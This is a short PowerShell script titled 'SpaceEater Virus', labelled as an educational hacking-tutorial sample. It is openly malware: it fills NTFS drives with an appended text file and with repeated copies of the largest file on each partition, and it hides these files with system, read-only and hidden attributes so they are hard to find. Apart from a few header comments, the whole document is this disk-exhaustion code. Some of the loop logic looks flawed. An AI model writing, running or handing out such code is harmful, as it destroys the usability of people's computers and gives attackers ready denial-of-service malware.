#SpaceEater Virus
#Coded By Karem Ali 
#Don't Run it on Your Pc , Run it on a Virtual Machine 
#For Education Purpose Only 
#It's Part of IHACK Scripting Tutorial
$A = Get-Volume |where{$_.FileSystem -like "NTFS" }| select  -ExpandProperty  DriveLetter -Last 1
$B = " Karem Ali " 
$H = ":"
$T = $C
$B | Out-File $A$H\space.txt
While ( $C -gt $T - 1024 *  10  ) 
{
 $B | Out-File -Append $A$H\space.txt
 $C = get-volume | where{$_.DriveLetter -like "$A" } | select -ExpandProperty SizeRemaining
}
attrib +s +r +h $A$H\space.txt 

$Partitions = Get-Volume |where{$_.FileSystem -like "NTFS" }| select  -ExpandProperty  DriveLetter
[int]$count = $Partitions.Length

while ( $count -gt 0 )
{


$vol = $Partitions[$count-1]
$C = get-volume | where{$_.DriveLetter -like "$vol" } | select -ExpandProperty SizeRemaining
Set-Location $vol$H

[int]$Size = 1024 * 1024 * 900 
$Item = Get-ChildItem -Recurse |where{$_.length -gt "$Size"} | sort length -Descending | select -ExpandProperty Name | select -First 1 
$Path = Get-ChildItem -Recurse |where{$_.length -gt "$Size"} | sort length -Descending | Select -First 1

while ( $C -gt 0 )
{ 
Set-Location (Split-Path $Path.FullName)
copy $Item SpaceEater.KAF
attrib +h +r +s SpaceEater.KAF
$C = get-volume | where{$_.DriveLetter -like "$Partitions[$count-1]" } | select -ExpandProperty SizeRemaining
}
$Count -= 1 
}

